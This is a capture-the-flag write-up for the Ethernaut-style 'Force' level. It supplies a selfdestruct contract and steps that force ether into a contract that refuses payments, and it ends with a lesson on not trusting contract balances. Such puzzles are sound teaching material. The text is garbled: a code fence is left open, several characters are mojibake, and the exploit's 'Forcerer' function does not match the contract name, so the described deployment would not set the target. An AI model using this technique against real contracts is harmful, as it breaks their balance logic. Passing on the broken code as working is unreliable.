# Force
_difficulty 5/10_

Some contracts will simply not take your money `Â¯\_(ãƒ„)_/Â¯`  

The goal of this level is to make the balance of the contract greater than zero.  

Things that might help:  
- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

```
pragma solidity ^0.4.18;

## Force solution

Contracts will dump their ether on anyone when destroyed. Let's use that.  

1. Get current contract address.  
`contract.address`  

2. Use Remix to deploy `GiverOfMoney.sol` with current contract address as parameter.  
```javascript
pragma solidity ^0.4.18;

contract GiverOfMoney {
  address _forcee;

  function Forcerer(address forcee) public {
    _forcee = forcee;
  }

  function() public payable {
  }

  function kill() public {
    selfdestruct(_forcee);
  }

  function balance() public view returns (uint256) {
    return address(this).balance;
  }
}
```

3. Send transaction and give ether to the `GiverOfMoney` using the fallback function.  

4. Invoke `kill` function on the `GiverOfMoney`.  

5. Check balance of contract.  
`await getBalance(contract.address)`  
0.001  

6. Submit instance ðŸŽ‰

## Lesson

In solidity, for a contract to be able to receive ether, the fallback function must be marked 'payable'.  
However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `this.balance == 0` for any contract logic.
